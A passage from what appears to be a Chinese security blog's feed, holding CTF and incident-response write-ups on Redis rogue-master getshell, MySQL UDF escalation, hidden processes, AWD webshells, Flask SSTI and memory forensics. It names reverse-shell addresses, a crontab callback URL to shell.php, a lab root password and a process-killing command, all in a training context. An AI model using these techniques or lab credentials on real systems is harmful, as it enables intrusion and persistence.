&lt;p&gt;挑战链接：&lt;a href=&quot;https://eksclustergames.com/challenge/&quot;&gt;https://eksclustergames.com/chall</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>玄机应急响应靶场-redis-mysql-BT3-权限维持</title>
    <link href="https://polosec.github.io/2023/12/22/%E7%8E%84%E6%9C%BA-ER-01/"/>
    <id>https://polosec.github.io/2023/12/22/%E7%8E%84%E6%9C%BA-ER-01/</id>
    <published>2023-12-22T13:02:39.000Z</published>
    <updated>2023-12-22T13:34:35.507Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>EDISEC的应急响应靶场，题目质量很好，比较贴合实战。</p><p>投稿可以给邀请码哦。靶场地址:<a href="https://xj.edisec.net/challenges">https://xj.edisec.net/challenges</a></p><h1 id="redis-ER"><a href="#redis-ER" class="headerlink" title="redis ER"></a>redis ER</h1><p>考点：redis主从复制getshell、github溯源、linux ER基础</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1,黑客攻击成功的ip flag&#123;127.0.0.1&#125;</span><br><span class="line">2,黑客第一次上传的恶意文件  flag&#123;xxxxxxxx&#125;</span><br><span class="line">3,黑客反弹shell的ip flag&#123;ip&#125;</span><br><span class="line">4,黑客的用户名和溯源分析后的flag flag格式 flag&#123;黑客的用户-关键字符串&#125; 注关键字符串 xxx-xxx-xxx-flag</span><br><span class="line">5,黑客篡改的命令 flag格式为：flag&#123;一个md5字符串&#125;</span><br></pre></td></tr></table></figure><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p> 13在爆破，20在主从复制，这两个ip交了都对</p><p><img src="http://cdn.polowong.top/image-20231222170618501.png" alt="image-20231222170618501"></p><p><img src="http://cdn.polowong.top/image-20231222170542900.png" alt="image-20231222170542900"></p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>redis主从复制，上传了exp.so，cat exp.so | grep -a flag</p><p><img src="http://cdn.polowong.top/image-20231222170408935.png" alt="image-20231222170408935"></p><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p><img src="http://cdn.polowong.top/image-20231222164432530.png" alt="image-20231222164432530"></p><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>authorized_keys中有用户名  xj-test-user </p><p>github溯源，查看历史版本，对比commit，找到flag  wow-you-find-flag</p><p><a href="https://github.com/xj-test-user/redis-rogue-getshell/commit/76b1b74b92f9cc6ef2a62985debdf09dcc056636">https://github.com/xj-test-user/redis-rogue-getshell/commit/76b1b74b92f9cc6ef2a62985debdf09dcc056636</a></p><p><img src="http://cdn.polowong.top/image-20231222170908185.png" alt="image-20231222170908185"></p><p>最后flag是flag{xj-test-user-wow-you-find-flag}</p><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>经典命令替换，/usr/bin ls -al看一下</p><p>看到ps 和ps_</p><p>然后file下ps</p><p><img src="http://cdn.polowong.top/image-20231222171129878.png" alt="image-20231222171129878"></p><p><img src="http://cdn.polowong.top/image-20231222171138662.png" alt="image-20231222171138662"></p><p>常见的考点了</p><p><img src="http://cdn.polowong.top/image-20231222171152663.png" alt="image-20231222171152663"></p><h1 id="mysql-ER"><a href="#mysql-ER" class="headerlink" title="mysql ER"></a>mysql ER</h1><p>考点：读配置文件，寻找webshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.黑客第一次写入的shell flag&#123;关键字符串&#125; </span><br><span class="line">2.黑客反弹shell的ip flag&#123;ip&#125;</span><br><span class="line">3.黑客提权文件的完整路径 md5 flag&#123;md5&#125; 注 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xx</span><br><span class="line">4.黑客获取的权限 flag&#123;whoami后的值&#125;</span><br></pre></td></tr></table></figure><h2 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h2><p>/var/www/html/sh.php</p><p><img src="http://cdn.polowong.top/image-20231222171614746.png" alt="image-20231222171614746"></p><h2 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h2><p>找tmp目录</p><p><img src="http://cdn.polowong.top/image-20231222172758003.png" alt="image-20231222172758003"></p><h2 id="3-1"><a href="#3-1" class="headerlink" title="3"></a>3</h2><p>翻/var/www/html/common.php找到数据库连接密码，然后看variables，找插件目录 文件是udf.so，完整路径md5一下即可</p><p>flag{b1818bde4e310f3d23f1005185b973e7}</p><p><img src="http://cdn.polowong.top/image-20231222172012044.png" alt="image-20231222172012044"></p><h2 id="4-1"><a href="#4-1" class="headerlink" title="4"></a>4</h2><p>mysql用户权限 udf之后不用想肯定是mysql</p><h2 id="蓝队的小心思3"><a href="#蓝队的小心思3" class="headerlink" title="蓝队的小心思3"></a>蓝队的小心思3</h2><p>考点：中间件日志分析，加密webshell分析，redis主从复制rce</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 审计日志，攻击者下载恶意木马文件的 ip是多少 flag&#123;ip&#125;</span><br><span class="line">2. 审计流量包，木马文件连接密码是什么? flag&#123;xxx&#125;</span><br><span class="line">3. 审计流量包，攻击者反弹的IP和端口是什么? flag&#123;ip:port&#125;</span><br><span class="line">4. 攻击者尝试了提权，请写出攻击者上传的恶意文件中的flag flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;</span><br><span class="line">5. 攻击者在服务器内权限维持请求外部地址和恶意文件的地址 flag&#123;http:&#x2F;&#x2F;xxxxxxxxxx&#x2F;xx.xxx&#125;</span><br></pre></td></tr></table></figure><p>1.</p><p>cat /var/log/apache/acc* </p><p><img src="http://cdn.polowong.top/image-20231222173837788.png" alt="image-20231222173837788"></p><p>找到shell /secret/.shell.php</p><p>192.168.150.253</p><h2 id="2-2"><a href="#2-2" class="headerlink" title="2"></a>2</h2><p>Wireshark 过滤 http.request.method==POST</p><p><img src="http://cdn.polowong.top/image-20231222174217232.png" alt="image-20231222174217232"></p><p>连接密码是cmd</p><h2 id="3-2"><a href="#3-2" class="headerlink" title="3"></a>3</h2><p>看流量 解base64</p><p>flag{192.168.150.199:4444}</p><p><img src="http://cdn.polowong.top/image-20231222174505496.png" alt="image-20231222174505496"></p><p><img src="http://cdn.polowong.top/image-20231222174519746.png" alt="image-20231222174519746"></p><h2 id="4-2"><a href="#4-2" class="headerlink" title="4"></a>4</h2><p>看redis log 有加载module.so</p><p>根目录 cat module.so | grep flag即可</p><h2 id="5-1"><a href="#5-1" class="headerlink" title="5"></a>5</h2><p>/etc/crontab</p><p><a href="http://192.168.150.199:88/shell.php">http://192.168.150.199:88/shell.php</a></p><h1 id="权限维持-linux权限维持-隐藏"><a href="#权限维持-linux权限维持-隐藏" class="headerlink" title="权限维持-linux权限维持-隐藏"></a>权限维持-linux权限维持-隐藏</h1><p>考点：动态链接库劫持、linux ER基础</p><p>题目</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssh root@env.xj.edisec.net -p  密码  xjqxwcyc</span><br><span class="line">1.黑客隐藏的隐藏的文件 完整路径md5</span><br><span class="line">2.黑客隐藏的文件反弹shell的ip+端口 &#123;ip:port&#125;</span><br><span class="line">3.黑客提权所用的命令 完整路径的md5 flag&#123;md5&#125; </span><br><span class="line">4.黑客尝试注入恶意代码的工具完整路径md5</span><br><span class="line">5.使用命令运行 .&#x2F;x.xx 执行该文件  将查询的 Exec****** 值 作为flag提交 flag&#123;&#x2F;xxx&#x2F;xxx&#x2F;xxx&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h2><p>libprocesshider隐藏进程，文件名在processhider中</p><p><img src="http://cdn.polowong.top/image-20231222200444377.png" alt="image-20231222200444377"></p><p>文件名是1.py</p><p>绝对路径是/tmp/.temp/libprocesshider/1.py</p><p>flag{109ccb5768c70638e24fb46ee7957e37}</p><h2 id="2-3"><a href="#2-3" class="headerlink" title="2"></a>2</h2><p>Libporcesshider 隐藏进程，可以去github看下,1.py中有反弹shell</p><p><img src="http://cdn.polowong.top/image-20231222200300397.png" alt="image-20231222200300397"></p><p><img src="http://cdn.polowong.top/image-20231222200318398.png" alt="image-20231222200318398"></p><p>flag{114.114.114.121:9999}</p><h2 id="3-3"><a href="#3-3" class="headerlink" title="3"></a>3</h2><p>find命令提权，尝试了一下可以用，所以交</p><p>/usr/bin/find</p><h2 id="4-3"><a href="#4-3" class="headerlink" title="4"></a>4</h2><p>常用目录opt ls -al</p><p>发现一个工具cymothoa，搜了搜发现是一个常见的后门工具，直接提交</p><p>/opt/.cymothoa-1-beta/cymothoa的md5即可</p><p>087c267368ece4fcf422ff733b51aed9</p><h2 id="5-2"><a href="#5-2" class="headerlink" title="5"></a>5</h2><p>libprocesshider隐藏了/tmp/.temp/libprocesshider/1.py，清除/etc/ld.so.preload之后可以看到启动命令</p><p><img src="http://cdn.polowong.top/image-20231222205528811.png" alt="image-20231222205528811"></p><p>题目问1.py的启动命令的可执行程序是什么</p><p>那么就是Python3，ls /usr/bin/python3 -al 看下软连接</p><p><img src="http://cdn.polowong.top/image-20231222205751243.png" alt="image-20231222205751243"></p><p>那么最后提交flag{}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;EDISEC的应急响应靶场，题目质量很好，比较贴合实战。&lt;/p&gt;
&lt;p&gt;投稿可以给邀请码哦。靶场地址:&lt;a href=&quot;https://xj</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>AWD不死马分析</title>
    <link href="https://polosec.github.io/2023/07/01/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC%E5%88%86%E6%9E%90/"/>
    <id>https://polosec.github.io/2023/07/01/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC%E5%88%86%E6%9E%90/</id>
    <published>2023-07-01T12:16:14.000Z</published>
    <updated>2023-07-02T04:04:20.173Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在练习AWD的时候遇到了一个很棘手的不死马，功能主要就是删站，于是本文对该不死马进行分析并寻找对策。</p><h1 id="场景一-先手不死马权限维持"><a href="#场景一-先手不死马权限维持" class="headerlink" title="场景一 :先手不死马权限维持"></a>场景一 :先手不死马权限维持</h1><p>对手不死马会在网站根目录下循环生成.xxxxxx.php名称的webshell，同时会循环删除除自身以外的其它所有网站目录及文件。</p><p>首先给自己服务器www-data权限在web根目录上个不死马</p><p><img src="http://cdn.polowong.top/image-20230701182147014.png" alt="image-20230701182147014"></p><p>但是这里有个问题，直接访问shell是404，除了game路由和index其他任何文件/目录访问都是404，第一反应可能是apache配置问题，但是apache配置在AWD环境中无法修改，感觉要考虑htaccess问题。htaccess代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"># Some servers require this option to be enabled</span><br><span class="line">Options -MultiViews</span><br><span class="line"></span><br><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">    RewriteEngine On</span><br><span class="line"></span><br><span class="line">    # Uncomment two lines below to redirect all non-www traffic to www</span><br><span class="line">    # Make sure your baseurl config is set to www. domain</span><br><span class="line">    # RewriteCond %&#123;HTTP_HOST&#125; !^www\. [NC]</span><br><span class="line">    # RewriteRule ^(.*)$ http:&#x2F;&#x2F;www.%&#123;HTTP_HOST&#125;&#x2F;$1 [R&#x3D;301,L]</span><br><span class="line"></span><br><span class="line">    # Uncomment two lines below to redirect all non-secure traffic to https:&#x2F;&#x2F;</span><br><span class="line">    # Make sure you enabled HTTPS in Dashboard &#x2F; System &#x2F; System in Subrion CMS</span><br><span class="line">    # RewriteCond %&#123;HTTPS&#125; off</span><br><span class="line">    # RewriteRule (.*) https:&#x2F;&#x2F;%&#123;HTTP_HOST&#125;%&#123;REQUEST_URI&#125; [R&#x3D;301,L]</span><br><span class="line"></span><br><span class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">    RewriteCond %&#123;REQUEST_URI&#125; !(.*)\.(.*)$</span><br><span class="line">    RewriteRule ^(.+[^&#x2F;])$ http:&#x2F;&#x2F;%&#123;HTTP_HOST&#125;%&#123;REQUEST_URI&#125;&#x2F; [L,R&#x3D;301]</span><br><span class="line">    RewriteRule ^(game)($|&#x2F;) - [L]</span><br><span class="line">    # Return default not-found as it&#39;s faster</span><br><span class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">    RewriteRule \.(jpg|jpeg|png|gif|bmp|ico|swf|js|css|woff|ttf)$ - [NC,R&#x3D;404,L]</span><br><span class="line"></span><br><span class="line">    # Google sitemap controller</span><br><span class="line">    RewriteRule ^(tmp&#x2F;)?sitemap.xml$ tmp&#x2F;sitemap.xml [L]</span><br><span class="line"></span><br><span class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; -f</span><br><span class="line">    RewriteRule ^(.*)(\.php([0-9]*)|\.json|\.xml|\.tpl|\.phtml|\.ini|\.inc|&#x2F;)$ index.php?_p&#x3D;$1 [NC,QSA,L]</span><br><span class="line"></span><br><span class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">    RewriteRule ^(.*)$ index.php?_p&#x3D;$1 [QSA,L]</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br><span class="line"></span><br><span class="line">&lt;IfModule mod_deflate.c&gt;</span><br><span class="line">    &lt;IfModule mod_setenvif.c&gt;</span><br><span class="line">        &lt;IfModule mod_headers.c&gt;</span><br><span class="line">            SetEnvIfNoCase ^(Accept-EncodXng|X-cept-Encoding|X&#123;15&#125;|~&#123;15&#125;|-&#123;15&#125;)$ ^((gzip|deflate)\s*,?\s*)+|[X~-]&#123;4,13&#125;$ HAVE_Accept-Encoding</span><br><span class="line">            RequestHeader append Accept-Encoding &quot;gzip,deflate&quot; env&#x3D;HAVE_Accept-Encoding</span><br><span class="line">        &lt;&#x2F;IfModule&gt;</span><br><span class="line">    &lt;&#x2F;IfModule&gt;</span><br><span class="line"></span><br><span class="line">    &lt;IfModule mod_filter.c&gt;</span><br><span class="line">        AddOutputFilterByType DEFLATE \</span><br><span class="line">            text&#x2F;html text&#x2F;plain text&#x2F;xml text&#x2F;css text&#x2F;javascript text&#x2F;xml \</span><br><span class="line">            application&#x2F;xml application&#x2F;xhtml+xml application&#x2F;rss+xml \</span><br><span class="line">            application&#x2F;javascript application&#x2F;x-javascript application&#x2F;json \</span><br><span class="line">            font&#x2F;opentype application&#x2F;x-font-ttf font&#x2F;eot \</span><br><span class="line">            image&#x2F;x-icon image&#x2F;vnd.microsoft.icon image&#x2F;svg+xml image&#x2F;svg+xml</span><br><span class="line">    &lt;&#x2F;IfModule&gt;</span><br><span class="line"></span><br><span class="line">    &lt;IfModule mod_mime.c&gt;</span><br><span class="line">        AddEncoding gzip svgz</span><br><span class="line">    &lt;&#x2F;IfModule&gt;</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure><p>通过向gpt查询可以知道自己上传的任何文件都会被当作传入index.php中，所以直接先把这个删了</p><p><img src="http://cdn.polowong.top/image-20230701185159366.png" alt="image-20230701185159366"></p><p>然后再次访问自己上传的不死马，成功</p><p><img src="http://cdn.polowong.top/image-20230701185411193.png" alt="image-20230701185411193"></p><p>下面模拟对手运行上面的shell命令</p><p><img src="http://cdn.polowong.top/image-20230701190316490.png" alt="image-20230701190316490"></p><p>现在已经是被删站的状态了，所有文件都无法落地。</p><p>现在由于先手种植了webshell，所以还有主机www-data权限</p><h2 id="恢复主机"><a href="#恢复主机" class="headerlink" title="恢复主机"></a>恢复主机</h2><p>在蚁剑中，还是可以使用shell的，首先考虑把www-data用户的apache进程kill掉,这里需要注意，必须是www-data用户才可以，<strong>也就是必须通过先手种的内存马执行命令</strong>,通过下面命令可以kill www-data用户的所有进程，同时清除内存马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kill -9 -1</span><br><span class="line">kill &#96;ps -ef | grep apache2 | grep -v grep | awk &#39;&#123;print $2&#125;&#39;&#96;</span><br></pre></td></tr></table></figure><p>最后删除对手的php文件，恢复对主机的控制，并将网站备份文件还原</p><p><img src="http://cdn.polowong.top/image-20230701192308062.png" alt="image-20230701192308062"></p><h1 id="场景二：彻底失去主机权限"><a href="#场景二：彻底失去主机权限" class="headerlink" title="场景二：彻底失去主机权限"></a>场景二：彻底失去主机权限</h1><p>该场景对应于没有先手落地不死马，即被攻陷后直接被删站，无法落地文件。</p><p>我的评价是寄，开局好好修吧。</p><h1 id="延申"><a href="#延申" class="headerlink" title="延申"></a>延申</h1><p>RSA不死马 参考<a href="https://xz.aliyun.com/t/4640#toc-3">https://xz.aliyun.com/t/4640#toc-3</a> ，暂未复现</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近在练习AWD的时候遇到了一个很棘手的不死马，功能主要就是删站，于是本文对该不死马进行分析并寻找对策。&lt;/p&gt;
&lt;h1 id=&quot;场景一-先</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>四川省信息安全技术大赛 AWD部分WriteUp</title>
    <link href="https://polosec.github.io/2022/11/14/%E5%9B%9B%E5%B7%9D%E7%9C%81%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-AWD%E9%83%A8%E5%88%86WriteUp/"/>
    <id>https://polosec.github.io/2022/11/14/%E5%9B%9B%E5%B7%9D%E7%9C%81%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-AWD%E9%83%A8%E5%88%86WriteUp/</id>
    <published>2022-11-14T13:52:55.000Z</published>
    <updated>2022-11-14T13:55:25.487Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>有一年多没打过awd了，这次awd的题目正好遇到了会的，一道PHP一道python还有一个java，队伍里面正好有个java佬，直接起飞。</p><p>初始分七万，15分钟一轮，一个flag一百分，最后打了22w多分，我们14w分的时候第二名才11w，具体最后差我们多少不太清楚。</p><p>题外话：敢欺负我师弟？无所谓，我会出手。（</p><p>我主要做的php和python题，所以就说下这两道题怎么做的</p><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>由于前30分钟是加固时间，所以可以不慌不忙的把php修好。</p><p>php这道题拿到手SSH上去之后首先做的就是对网站进行整站备份，为了加快scp/sftp传输速度，直接tar压缩整站。</p><p>源代码搞下来之后用D盾、河马进行webshell查杀，使用seay进行自动代码审计，一共找到了<strong>两三个读flag点，一个文件上传点</strong>。</p><p>在复原的时候还是尽量按照AWD赛时的思路去还原，争取还原选手赛时最真实的思路。</p><p>备份下源代码之后我们尝试开启waf的流量记录功能或者weblogger，但是我们自己魔改后的waf开不起来，并且担心主办方check原版waf的路径，所以最后没有开waf。</p><p>weblogger部署之后站点无法正常访问，遂放弃，本次AWD PHP题所有的漏洞点均为人工审计得出。</p><p>接下来先随意看一下目录有没有隐藏文件或者敏感文件，在根目录发现db.sql，直接删掉</p><p><img src="http://cdn.polowong.top/image-20221114211911607.png" alt="image-20221114211911607"></p><p>接下来根据经验去查看uploads目录是否有可疑文件</p><p><img src="http://cdn.polowong.top/image-20221114211950195.png" alt="image-20221114211950195"></p><p>在检查完之后还需要做的就是连接数据库进行备份，这里我疏忽了忘记了备份，不过问题不大，应该是没有人能成功打进来我们的靶机进行提权或者破坏，不过无法确定，因为这次的平台没有给每道题的状态，如靶机是否down，每轮是否被check等，呵呵。</p><p>进入数据库之后要做的就是修改网站后台密码，这也是常识了，一般来说网站后台密码是弱口令，试了下123456还是admin来着就进去了。</p><p>这里改密码出了点问题，我以为密码是MD5之后的值 但是我md5之后的结果和网站存储的结果不太一样，所以后面我改掉之后自己的网站也没有再上去了，只要保证别人登不进去后台就可以，我自己需要的话可以在改回去默认的密码。</p><p>网站后台改完基本上数据库也OK了，接下来进行代码审计</p><h2 id="命令执行与任意SQL执行"><a href="#命令执行与任意SQL执行" class="headerlink" title="命令执行与任意SQL执行"></a>命令执行与任意SQL执行</h2><h3 id="manage-comment-del-php"><a href="#manage-comment-del-php" class="headerlink" title="manage_comment_del.php"></a>manage_comment_del.php</h3><p><img src="http://cdn.polowong.top/image-20221114212500151.png" alt="image-20221114212500151"></p><p>这个点有命令执行，但是我无法执行命令，因为当时加固阶段网站被waf搞down了，所以我直接修了</p><p><img src="http://cdn.polowong.top/image-20221114212544836.png" alt="image-20221114212544836"></p><p><img src="http://cdn.polowong.top/image-20221114212641835.png" alt="image-20221114212641835"></p><p>这里的修复方式同理，不再赘述。</p><h3 id="Manage-rce-php"><a href="#Manage-rce-php" class="headerlink" title="Manage_rce.php"></a><strong>Manage_rce.php</strong></h3><p><img src="http://cdn.polowong.top/image-20221114212809933.png" alt="image-20221114212809933"></p><p><img src="http://cdn.polowong.top/image-20221114213001674.png" alt="image-20221114213001674"></p><p>修复方式也很简单 直接把对应的代码删掉</p><h3 id="manage-sql-php"><a href="#manage-sql-php" class="headerlink" title="manage_sql.php"></a>manage_sql.php</h3><p>这题给👴🏻整乐了，看到SQL注入都不load_file是吧，说句题外话，在打网站后台漏洞的时候我根本没打过rce，直接打SQL语句这个点，过了很久了大部分人还没修，乐。</p><p><img src="http://cdn.polowong.top/image-20221114213126545.png" alt="image-20221114213126545"></p><p>把TRUE改成FALSE就可以修复了。</p><h2 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h2><h3 id="user-upload-php"><a href="#user-upload-php" class="headerlink" title="user_upload.php"></a>user_upload.php</h3><p><img src="http://cdn.polowong.top/image-20221114213328286.png" alt="image-20221114213328286"></p><p>没啥过滤，修复方法如下</p><p><img src="http://cdn.polowong.top/image-20221114213441556.png" alt="image-20221114213441556"></p><p>PHP题基本就到这里了，后面或许出了新洞，没有再审计了，一直在干flask内存马。</p><h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><p>python这题给了一个blog系统，是flask写的，那么我首先想到的就是模板注入。</p><p>代码看了半天也没啥收获，其实这里我的思路有点问题，我忘记直接去搜render_template_string了。直接搜的话可以在加固阶段直接定位到漏洞点。在加固阶段这题也没看出来啥，代码太多了，上去网站功能也很多，前两个小时就没怎么管这道题。</p><p>后面我们java和php题都搞完了之后发现有扣分，估计就是python题出问题了，好巧不巧根目录给了web日志</p><p><img src="http://cdn.polowong.top/image-20221114213804022.png" alt="image-20221114213804022"></p><p>那么就可以充分发挥流量人的特长，看日志。</p><p>日志中有大量扫描器等垃圾流量，试了试不太行，最后发现扣分的时候一直有向/auth/reset路由发送请求，遂进入代码查看</p><p><img src="http://cdn.polowong.top/image-20221114213936187.png" alt="image-20221114213936187"></p><p>看最后的渲染方法是什么，flask人狂喜，已经可以定位漏洞点就在这里了，我首先做的是修复，其次是批量攻击</p><p>这题修也非常简单，我直接把花括号过滤了,传了花括号直接返回</p><p><img src="http://cdn.polowong.top/image-20221114214124190.png" alt="image-20221114214124190"></p><p>下面需要做的就是对这题进行利用，知道这个漏洞点之后我自己试了一下，但是并没有回显SSTI打过去的payload，比较奇怪，我以为是自己payload的问题，遂写了几句话看一下别人payload</p><p><img src="http://cdn.polowong.top/image-20221114214314454.png" alt="image-20221114214314454"></p><p>最后看到payload就是最简单的ssti payload，由于备份没有存所以展示不了了。可以去看hackbar最简单的那个。</p><p>既然确定了是在这里利用漏洞，那么回显的flag在哪里？</p><p>我从burp直接看了render后的结果，然后翻了一下源代码发现回显结果是以注释的形式体现，所以这题也就解出来了，最后写脚本批量交，每一轮能打四千多分。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h1&gt;&lt;p&gt;有一年多没打过awd了，这次awd的题目正好遇到了会的，一道PHP一道python还有一个java，队伍里面正好有个java</summary>
      
    
    
    
    
    <category term="awd" scheme="https://polosec.github.io/tags/awd/"/>
    
  </entry>
  
  <entry>
    <title>2022巅峰极客_ez_forensic</title>
    <link href="https://polosec.github.io/2022/10/23/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-ez-forensic/"/>
    <id>https://polosec.github.io/2022/10/23/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-ez-forensic/</id>
    <published>2022-10-23T14:52:26.000Z</published>
    <updated>2022-10-23T14:53:13.199Z</updated>
    
    <content type="html"><![CDATA[<p>一道不错的取证题目，主要考察微信聊天记录解密</p><h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>巅峰极客2022-Misc-easy_Forensic</p><p>小明不小心把自己出题的flag在微信中发了出去，你能找到这个flag吗？</p><h1 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h1><p>使用volatility分析,主要看cmdline cmdscan filescan等参数</p><p>一个小技巧，filesscan可以grep一下Desktop</p><p><img src="http://cdn.polowong.top/image-20221023222329036.png" alt="image-20221023222329036"></p><p><img src="http://cdn.polowong.top/image-20221023222353894.png" alt="image-20221023222353894"></p><p>一共四个可疑文件，依次dump出来</p><h2 id="gift-jpg"><a href="#gift-jpg" class="headerlink" title="gift.jpg"></a>gift.jpg</h2><p><img src="http://cdn.polowong.top/image-20221023222502204.png" alt="image-20221023222502204"></p><p>感觉下面还有东西，拉一下高度</p><p><img src="http://cdn.polowong.top/image-20221023222522678.png" alt="image-20221023222522678"></p><p>010editor打开，修改对应值</p><p><img src="http://cdn.polowong.top/image-20221023222538477.png" alt="image-20221023222538477"></p><p>获得密码是</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nothing is more important than your life!</span><br></pre></td></tr></table></figure><h2 id="hint-txt"><a href="#hint-txt" class="headerlink" title="hint.txt"></a>hint.txt</h2><p>直接dump不出来，用DG看一下,分区加载进来之后点击恢复文件就可以了，意思大概就是用下划线替换空格</p><p><img src="http://cdn.polowong.top/image-20221023223243272.png" alt="image-20221023223243272"></p><p>那么密码就是</p><p>Nothing_is_more_important_than_your_life!</p><h2 id="secret-zip"><a href="#secret-zip" class="headerlink" title="secret.zip"></a>secret.zip</h2><h3 id="gift-txt"><a href="#gift-txt" class="headerlink" title="gift.txt"></a>gift.txt</h3><p><img src="http://cdn.polowong.top/image-20221023223442659.png" alt="image-20221023223442659"></p><p>密码Nothing_is_more_important_than_your_life!</p><p>尝试解压</p><p><img src="http://cdn.polowong.top/image-20221023223508868.png" alt="image-20221023223508868"></p><p>不知道是什么，先留着wHeMscYvTluyRvjf5d7AEX5K4VlZeU2IiGpKLFzek1Q=</p><h2 id="wechat-txt"><a href="#wechat-txt" class="headerlink" title="wechat.txt"></a>wechat.txt</h2><p>题目要求是恢复微信聊天记录，那么wechat.txt可能是数据库文件，找一下怎么恢复微信聊天记录</p><p><a href="https://www.ctfiot.com/49052.html">https://www.ctfiot.com/49052.html</a></p><p>将wechat.txt 重命名wechat.db 放到指定目录下</p><p><img src="http://cdn.polowong.top/image-20221023224500620.png" alt="image-20221023224500620"></p><p>上层目录运行</p><p><img src="http://cdn.polowong.top/image-20221023224517167.png" alt="image-20221023224517167"></p><p>navicat看一下数据库</p><p><img src="http://cdn.polowong.top/image-20221023224735853.png" 